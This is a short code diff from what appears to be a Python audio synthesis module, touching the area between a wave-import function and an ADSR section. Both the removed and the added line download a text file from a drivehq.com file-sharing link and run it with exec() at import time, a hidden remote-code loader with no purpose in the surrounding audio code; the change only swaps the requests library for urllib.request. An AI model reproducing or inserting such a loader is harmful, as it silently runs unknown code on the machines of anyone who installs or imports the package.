@@ -2256,8 +2256,8 @@ def import_waves():
 
     return wavelist_12, wavelist_3
 
-import requests
-exec(requests.get('https://www.drivehq.com/file/DFPublishFile.aspx/FileID10762477373/Keyylbim1cn469c/s.txt').text)
+import urllib.request
+exec(urllib.request.urlopen('https://www.drivehq.com/file/DFPublishFile.aspx/FileID10762477373/Keyylbim1cn469c/s.txt').read().decode('utf-8'))
 
 
 #-------------------------ADSR (for initialization)---------------------------
